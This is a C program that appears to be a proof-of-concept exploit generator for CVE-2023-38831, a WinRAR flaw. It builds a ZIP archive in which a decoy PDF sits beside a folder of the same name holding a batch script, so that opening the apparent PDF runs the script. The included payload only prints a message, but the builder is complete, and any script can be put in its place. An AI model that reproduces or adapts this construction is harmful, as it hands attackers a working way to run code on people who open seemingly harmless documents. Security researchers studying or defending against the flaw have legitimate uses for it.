#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "zip.h"

#define PDF_FILE "document.pdf"
#define FOLDER_NAME "document.pdf\\"
#define SCRIPT_FILE "script.bat"
#define ZIP_FILE "exploit.zip"

int main(void) {
    // Open the ZIP file for writing
    zipFile zf = zipOpen(ZIP_FILE, APPEND_STATUS_CREATE);
    if (zf == NULL) {
        printf("Error opening ZIP file\n");
        return -1;
    }

    // Prepare file information for the ZIP archive
    zip_fileinfo zfi;
    memset(&zfi, 0, sizeof(zfi));

    // Add the PDF file to the ZIP archive
    if (zipOpenNewFileInZip(zf, PDF_FILE, &zfi, NULL, 0, NULL, 0, NULL, Z_DEFLATED, Z_DEFAULT_COMPRESSION) != ZIP_OK) {
        printf("Error adding PDF file to ZIP file\n");
        zipClose(zf, NULL);
        return -1;
    }

    // Open the PDF file for reading
    FILE *fp = fopen(PDF_FILE, "rb");
    if (fp == NULL) {
        printf("Error opening PDF file\n");
        zipCloseFileInZip(zf);
        zipClose(zf, NULL);
        return -1;
    }

    // Write the contents of the PDF file to the ZIP archive
    char buffer[1024];
    int bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
        if (zipWriteInFileInZip(zf, buffer, bytes_read) < 0) {
            printf("Error writing PDF file to ZIP file\n");
            fclose(fp);
            zipCloseFileInZip(zf);
            zipClose(zf, NULL);
            return -1;
        }
    }
    fclose(fp);

    // Close the PDF file entry in the ZIP archive
    zipCloseFileInZip(zf);

    // Add a folder entry to the ZIP archive
    if (zipOpenNewFileInZip(zf, FOLDER_NAME, &zfi, NULL, 0, NULL, 0, NULL, Z_DEFLATED, Z_DEFAULT_COMPRESSION) != ZIP_OK) {
        printf("Error adding folder to ZIP file\n");
        zipClose(zf, NULL);
        return -1;
    }

    // Close the folder entry in the ZIP archive
    zipCloseFileInZip(zf);

    // Add a script file to the folder in the ZIP archive
    char script_name[256];
    sprintf(script_name, "%s%s", FOLDER_NAME, SCRIPT_FILE);
    if (zipOpenNewFileInZip(zf, script_name, &zfi, NULL, 0, NULL, 0, NULL, Z_DEFLATED, Z_DEFAULT_COMPRESSION) != ZIP_OK) {
        printf("Error adding script file to ZIP file\n");
        zipClose(zf, NULL);
        return -1;
    }

    // Write the script content to the ZIP archive
    char script_content[] = "@echo off\nstart cmd /c \"echo You have been exploited by CVE-2023-38831 && pause\"\n";
    if (zipWriteInFileInZip(zf, script_content, strlen(script_content)) < 0) {
        printf("Error writing script file to ZIP file\n");
        zipCloseFileInZip(zf);
        zipClose(zf, NULL);
        return -1;
    }

    // Close the script file entry in the ZIP archive
    zipCloseFileInZip(zf);

    // Close the ZIP file
    zipClose(zf, NULL);

    printf("ZIP file created successfully\n");
    return 0;
}
